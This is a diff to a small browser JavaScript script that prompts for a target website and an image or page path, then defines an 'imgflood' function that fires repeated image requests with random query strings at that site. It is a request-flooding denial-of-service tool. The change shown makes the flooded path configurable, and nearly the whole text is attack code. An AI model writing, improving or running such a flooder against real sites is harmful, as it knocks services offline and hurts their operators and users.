@@ -1,7 +1,7 @@
 function a() {
 
     var x = prompt("Website Here, example.com: ");
-   
+    var a = prompt("Image Url Or /index.php, add / to the end: ");
 
 let text = "Are You Sure?\nOK or Cancel.";
 if (confirm(text) == true) {
@@ -11,7 +11,7 @@ text = document.write("SENDING REQUESTS TO : " + x);
 
 function imgflood() { 
 var TARGET = x
-var URI = '/index.php'
+var URI = a
 var pic = new Image()
 var rand = Math.floor(Math.random() * 1000)
 pic.src = 'http://'+TARGET+URI+rand+'=val'
